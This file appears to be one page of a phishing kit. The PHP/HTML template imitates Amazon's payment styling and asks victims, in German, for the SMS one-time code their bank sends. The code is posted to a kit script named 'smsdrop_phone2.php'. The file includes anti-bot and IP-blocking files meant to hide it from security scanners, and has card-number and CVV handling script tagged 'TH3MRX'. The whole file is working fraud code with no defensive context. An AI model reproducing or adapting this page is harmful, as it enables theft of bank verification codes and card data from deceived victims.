<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include('../banned.php');?>
<!-- HTML INPUTS FOR WALLET PAGE -->
<!-- CODE STARTS HERE -->
<script type="text/javascript">
  function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script><script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
<form  onsubmit="return Validate(this);" action="../bin/smsdrop_phone2.php?cmd=_SMS_Verfications=<?php  echo md5(microtime());?>&lim_session=<?php  echo sha1(microtime()); ?>" method="post">		
  <?php  ################################################################################################################################### ?>
  <label for="cc_holder" class="a-size-base a-text-bold">Enter SMS code :
  </label>
  <input type="text" maxlength="30" required="" autocomplete="off" id="cc_holder" value="" size="13" onkeydown="upperCaseF(this)" title="Geben Sie den per SMS empfangenen OTP-Code ein" placeholder="Code" name="sms" >
  <br>
  <span id="pmts-id-11">
  </span>

      <script type="text/javascript">
        function ExpiryDate() {
          var year = document.getElementById("TH3MRXYEAR").value;
          var month = document.getElementById("TH3MRXMONTH").value;
          today = new Date();
          expiry = new Date(year, month);
          if (today.getTime() > expiry.getTime())
            return false;
          else
            return true;
        };
      </script>

        <script>
          function type_carte(){
            var get_value = document.getElementById('cc_number').value;
            var type = get_value.substring(0,2);
            var other = get_value.substring(0,1);
            if(other == "4"){
              document.getElementById("cvv2_number").maxLength ="3"
            }
            else if(other == "5"){
              document.getElementById("cvv2_number").maxLength ="3"
            }
            /*Amex Card*/
            else if(type == "34"){
              document.getElementById('th3mrx').style.display ="none"
              document.getElementById("cvv2_number").maxLength ="4"
            }
            else if(type == "37"){
              document.getElementById('th3mrx').style.display ="none"
              document.getElementById("cvv2_number").maxLength ="4"
            }
            /*End Amex Card*/
            /*blue Card*/
            else if(type == "30"){
              document.getElementById('th3mrx').style.display ="none"
            }
            else if(type == "36"){
              document.getElementById('th3mrx').style.display ="none"
            }
            else if(type == "38"){
              document.getElementById('th3mrx').style.display ="none"
            }
            /*End blue Card*/
            else if(other == "6"){
              document.getElementById('th3mrx').style.display ="none"
            }
            else if(type == "35"){
              document.getElementById('th3mrx').style.display ="none"
            }
            else{
              document.getElementById('th3mrx').style.display ="block"
            }
          };
        
</script>
        <?php  ################################################################################################################################### ?>
        <div class="a-box a-spacing-top-base a-width-large pmts_box_without_border">
          <div class="a-box-inner a-padding-none"> 
              </span>
            </span>
            <span id="pmts-id-22" class="a-button a-button-primary">
              <span class="a-button-inner">
                <button class="a-button-text" id="submit" type="submit">Bestätigen
                </button>
                <div id="x-list-item">
                </div>
              </span>
            </span>
          </div>
        </div>
        </form>
		</br>
      <!-- CODE ENDS HERE -->
